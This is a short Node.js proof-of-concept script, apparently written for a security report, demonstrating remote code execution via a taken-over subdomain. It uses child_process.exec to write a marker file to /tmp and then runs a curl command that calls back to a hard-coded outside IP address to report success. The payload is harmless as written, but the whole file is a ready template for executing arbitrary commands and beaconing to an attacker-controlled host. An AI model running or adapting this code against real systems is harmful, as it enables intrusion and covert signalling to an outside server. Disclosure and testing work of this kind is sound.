const { exec } = require('child_process');

// This is a proof of concept to demonstrate the potential for RCE.
// In a real attack, this script would be hosted on the taken-over subdomain.
// If the main application includes and executes this script, it could lead to RCE.

// Simulate a malicious command. In a real attack, this could be anything.
const command = 'echo "RCE Proof of Concept: The subdomain has been taken over!" > /tmp/rce.txt';

exec(command, (err, stdout, stderr) => {
  if (err) {
    // handle error
    return;
  }

  // command has been executed
  //Callback to my server
  exec('curl https://18.117.237.86/rce_callback?status=success', (err, stdout, stderr) => {
    if (err) {
      // handle error
      console.error(`callback error: ${err}`);
    }}
  );
});
